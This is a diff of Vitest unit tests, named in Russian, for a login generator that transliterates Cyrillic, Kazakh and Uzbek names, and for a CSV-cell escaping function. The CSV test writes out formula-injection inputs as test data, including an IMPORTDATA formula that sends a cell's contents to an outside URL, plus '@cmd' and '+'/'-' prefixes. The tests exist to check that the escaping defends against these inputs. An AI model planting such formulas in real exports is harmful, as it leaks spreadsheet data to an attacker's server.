@@ -1,5 +1,6 @@
 import { describe, expect, it } from "vitest";
 import { baseLogin, freeLogin, loginProblem } from "@/lib/login/logins";
+import { csvCell } from "@/lib/csv";
 
 describe("логины вида amuradyan (этап 52)", () => {
   it("первая буква имени и фамилия латиницей из ФИО «Фамилия Имя Отчество»", () => {
@@ -33,5 +34,24 @@ describe("логины вида amuradyan (этап 52)", () => {
     expect(loginProblem("1abc")).not.toBeNull();
     expect(loginProblem("a")).not.toBeNull();
     expect(loginProblem("мурадян")).not.toBeNull();
+  });
+});
+
+describe("после проверки кода этапа 52", () => {
+  it("логин не короче двух букв, казахские и узбекские буквы не теряются", () => {
+    expect(baseLogin("Я")).toBe("ya");
+    expect(baseLogin("Ы")).toBe("yuser");
+    expect(baseLogin("Әлиев Қанат")).toBe("kaliev");
+    expect(baseLogin("Ғаниев Ўктам")).toBe("uganiev");
+    expect(loginProblem(baseLogin("Ы"))).toBeNull();
+  });
+
+  it("ячейка CSV не превращается в формулу", () => {
+    expect(csvCell("Рева Тарас")).toBe('"Рева Тарас"');
+    expect(csvCell('=IMPORTDATA("https://x/?"&D3)')).toBe(`"'=IMPORTDATA(""https://x/?""&D3)"`);
+    expect(csvCell("+7 999")).toBe(`"'+7 999"`);
+    expect(csvCell("-1")).toBe(`"'-1"`);
+    expect(csvCell("@cmd")).toBe(`"'@cmd"`);
+    expect(csvCell(null)).toBe('""');
   });
 });
